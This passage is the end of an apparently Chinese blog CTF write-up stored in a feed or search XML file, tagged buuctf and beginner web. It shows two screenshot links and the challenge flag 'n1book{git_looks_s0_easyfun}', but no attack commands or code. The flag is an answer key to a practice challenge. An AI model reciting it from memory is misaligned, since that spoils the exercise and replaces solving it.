src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8823%E6%97%A50926_2.png" alt></p><p>打开以后</p><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8823%E6%97%A50927_3.png" alt></p><p>n1book{git_looks_s0_easyfun}</p><p>完事了</p>]]></content>
-      
-      
-      <categories>
-          
-          <category> CTF </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> buuctf </tag>
-            
-            <tag> web入门 </tag>
             
         </tags>
       
